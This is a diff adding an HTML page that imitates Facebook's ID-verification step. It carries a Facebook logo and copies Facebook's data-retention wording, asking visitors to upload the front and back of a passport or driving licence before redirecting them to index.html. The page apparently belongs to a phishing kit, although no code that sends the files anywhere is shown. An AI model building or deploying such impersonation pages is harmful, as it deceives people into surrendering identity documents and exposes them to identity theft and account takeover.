@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="./bootstrap.css">
+    <link rel="stylesheet" href="./style.css">
+    <link rel="icon" href="./image/logos--facebook.svg">
+    <!-- For Apple devices -->
+    <link rel="apple-touch-icon" sizes="120x120" href="/public/image/logos--facebook iphone.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="/public/image/logos--facebook iphone.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/public/image/logos--facebook iphone.png">
+
+</head>
+
+<body>
+    <section>
+        <div class="card mx-auto col-lg-5 col-md-10 col-12 mt-md-5">
+            <div class="px-3">
+                <p class="fs-5 text-center px-3 pt-2 fw-bold text-primary">Upload Your ID</p>
+            </div>
+            <div class="card mx-2 rounded-0 py-2 mb-2 shadow">
+                <div class="px-3">
+                    <p style="font-size: 13.7px; color: #b5b5b7; font-weight: 450;">To help us check this account
+                        belongs to you provide a clear, legible photo of your official ID. This could be a
+                        driving license, passport or other type of official identification. If there are any issue,
+                        we'll send you an email.</p>
+                </div>
+                <div class="px-3 pt-2">
+                    <p class="px-2 py-2"
+                        style="background-color: #F3F4F6; font-size: 13.7px; color: #b5b5b7; font-weight: 450;">When you
+                        submit a copy of your ID, we'll keep it for more than 30 days, but no more than 1 year,
+                        unless you opt out. This help us improve our automated systems for detecting fake IDs and
+                        related
+                        abuse. Your ID will not be visible on Facebook.
+                    </p>
+                </div>
+                <!-- <form class="" action=""> -->
+                    <div class="px-3">
+                        <div class="pb-2 lh-1">
+                            <label class="fw-medium pb-2" for="">Upload ID (Front) </label>
+                            <input class="form-control shadow-sm" type="file" id="frontid">
+                            <span class="error-d" id="frontIdError"><small>Please fill out this field</small></span>
+                        </div>
+                        <div class="lh-1 pt-1">
+                            <label class="fw-medium pb-2" for=""> Upload ID (Back) </label>
+                            <input class="form-control shadow-sm" type="file" id="backid">
+                            <span class="error-d" id="backIdError"><small>Please fill out this field</small></span>
+                        </div>
+                    </div>
+                    <div class="px-2">
+                        <button class="btn btn-primary w-100 mt-3" onclick="idContinue()">Continue</button>
+                    </div>
+                <!-- </form> -->
+            </div>
+        </div>
+    </section>
+    <script>
+        const frontId = document.getElementById('frontid')
+        const backId = document.getElementById('backid')
+
+        function idContinue(){
+            if(frontId.value == '' || backId.value == ''){
+                document.getElementById('frontIdError').style.display ='block'
+                document.getElementById('backIdError').style.display ='block'
+            }else{
+                document.getElementById('frontIdError').style.display ='none'
+                document.getElementById('backIdError').style.display ='none'
+                setTimeout(()=>{
+                    window.location.href = 'index.html'
+                }, 1000)
+            }
+        }
+    </script>
+</body>
+
+</html>
